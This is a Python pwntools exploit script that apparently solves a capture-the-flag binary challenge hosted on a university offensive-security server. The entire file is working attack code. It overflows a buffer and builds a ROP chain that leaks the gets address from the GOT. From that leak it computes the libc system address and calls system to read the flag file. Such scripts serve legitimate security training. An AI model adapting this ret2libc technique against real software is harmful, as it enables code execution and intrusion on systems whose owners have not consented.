#!/usr/bin/python
from pwn import *
import binascii

debug = False
p = ""
libc = ""
if debug:
    p = process("./rop")
    libc = ELF("/lib/x86_64-linux-gnu/libc-2.26.so")
else:
    p = remote("offsec-chalbroker.osiris.cyber.nyu.edu", 1343)
    p.sendline("krm504")
    libc = ELF("libc-2.19.so")
    pause(3)

gets = libc.symbols[b'_IO_gets']
system = libc.symbols[b'system']
sysoff = gets-system

popRDI = p64(0x004006b3) # ROP gaget
popShit = p64(0x004006ad)

#Useful GOTS
getGOT = p64(0x601030)
wrtGOT = p64(0x60100b)
puts = p64(0x4004c0)
gets = p64(0x4004f0)

# if debug:
#     gdb.attach(p, "break system\nc")
#     pause()

p.recv(1024)

# Get a leak
overflow = 'A'*0x28 + popRDI + getGOT + puts + popRDI + wrtGOT + gets + popRDI + wrtGOT + puts
p.sendline(overflow)

#Get the real gets value
theRealGets = p.recv(6)
theRealGets += '\x00'*(8-len(theRealGets))

theRealGets = u64(theRealGets)
theRealSystem = theRealGets - sysoff

# Get some shells, bby
overflow = 'cat flag.txt' + '\x00' + p64(theRealSystem)
p.sendline(overflow)

p.recvuntil('{')
flag = p.recvuntil('}')
print("flag{" + flag)
